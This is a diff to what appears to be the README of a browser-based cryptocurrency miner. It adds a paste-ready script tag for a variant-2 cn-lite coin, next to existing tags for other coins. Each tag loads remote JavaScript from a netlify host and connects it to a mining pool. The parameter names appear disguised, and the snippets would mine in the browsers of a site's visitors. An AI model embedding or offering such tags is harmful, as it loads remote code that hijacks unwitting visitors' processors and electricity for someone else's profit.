@@ -28,6 +28,10 @@ Attention: IPBC created their own PoW variant....so mining is disabled for the m
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=alpha.ultranote.org:5555" > </script>
 ```
+#### Attention: Special Case for some custom cn-lite (Turtle V2) variant fork coins: NXstream need ?algo=cn-lite?variant=2
+```sh
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=2?jason=pool.nxstream.io:3333" > </script>
+```
 #### Attention: Special Case for some custom cn-fast | POW coins: Masari need ?algo=cn/msr?variant=1<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=1?jason=masari.ingest.cryptoknight.cc:3333" > </script>
